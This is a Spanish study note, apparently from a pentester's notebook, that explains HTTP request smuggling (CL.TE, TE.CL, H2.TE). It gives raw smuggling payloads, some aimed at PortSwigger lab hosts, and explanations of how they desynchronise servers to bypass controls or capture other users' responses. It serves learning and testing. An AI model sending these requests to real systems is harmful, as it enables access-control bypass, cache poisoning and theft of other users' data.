---

---
---
## **Breve explicación:**

- HTTP Request Smuggling es una vulnerabilidad que ocurre cuando un servidor **front-end** y un servidor **back-end** interpretan de forma diferente los límites de una petición HTTP, normalmente por usar de manera distinta los encabezados `Content-Length` y `Transfer-Encoding`.
- Esto permite a un atacante **inyectar una segunda petición HTTP dentro del cuerpo de la primera**, que el back-end procesará como si fuera legítima, saltándose controles del front-end.

**Posibles objetivos del ataque:**
- Saltar autenticaciones o controles de seguridad.
- Realizar ataques de *cache poisoning*.
- Extraer datos de otros usuarios.

**Resumen de tipos:**
- **CL.TE:** El front-end interpreta la longitud del cuerpo usando `Content-Length`, mientras que el back-end usa `Transfer-Encoding`.
- **TE.CL:** El front-end interpreta usando `Transfer-Encoding` y el back-end con `Content-Length`.
- **TE.TE:** Ambos usan `Transfer-Encoding`, pero se puede inducir a uno a ignorarlo mediante técnicas de ofuscación.
-- --
## **Deteccion**
![[Pasted image 20250814174821.png]]

---
# **Casos:**

## **CL.TE**
**Request:**
```http
POST / HTTP/1.1
Host: domain.com
Content-Length: 44
Transfer-Encoding: chunked

0

GET /error HTTP/1.1
kike: kion
```

**Explicacion:**
- El **front-end** usa `Content-Length` y considera todo el body como **un único request**.
- El **back-end** usa `Transfer-Encoding: chunked`, **corta en `0\r\n\r\n`** y trata lo que sigue como **un segundo request** (el `GET`), que el front-end **nunca validó**.
- La **segunda respuesta** puede desincronizarse y entregarse al **próximo usuario** o permitir **bypass** de controles del front-end.
*Aclaracion:*
- Si llega a aceptar **`HTTP/1.0`** podemos enviar la solicitud sin ningun header (vale la pena probarlo).
-- -
## **TE.CL**
**Request1:**
```http
POST / HTTP/1.1
Host: domain.com
Content-Length: 4
Transfer-Encoding: chunked

38
POST /error HTTP/1.1
Content-Length: 30 

testing=test 
0

```

**Request2:**
```http
POST / HTTP/1.1
Host: domain.com
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5e
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

**Explicacion:**
- El **front-end** usa `Transfer-Encoding: chunked` y detecta el 0 como fin de la request. 
- El **back-end** usa `Content-Length` y considera que el body es **`5e\r\n`**.
- Esto genera que el **back-end** separe la request en 2 generando una desincronizacion. Esta desincronizacion se genera ya que el **Content-Length** es mayor a la data tramitada, por lo que el servidor queda en espera de los proximos bytes e incrusta los bytes obtenidos del proximo cliente que solicite el endpoint.
-- -
## **H2.TE**
**Request1:**
```http
POST / HTTP/2
Host: 0aeb00c904bfd8c8804085fa000e006a.web-security-academy.net
Transfer-Encoding: chunked
Content-Length: 120

0

GET / HTTP/1.1
Host: 0aeb00c904bfd8c8804085fa000e006a.web-security-academy.net
Content-Length: 12

testing=test

```

**Request2:**
```http
POST / HTTP/2
Host: 0aeb00c904bfd8c8804085fa000e006a.web-security-academy.net
Transfer-Encoding: chunked
Content-Length: 88

0

GET / HTTP/1.1
Host: 0aeb00c904bfd8c8804085fa000e006a.web-security-academy.net

```

**Explicacion:**
- Aprovechando que el **back-end** sigue procesando peticiones **`HTTP/1.1`** embebidas dentro de solicitudes **`HTTP/2`**, enviamos varias peticiones preparadas con un GET /x camuflado. Gracias a este desfase, logramos obtener la respuesta de otra sesión.
--- 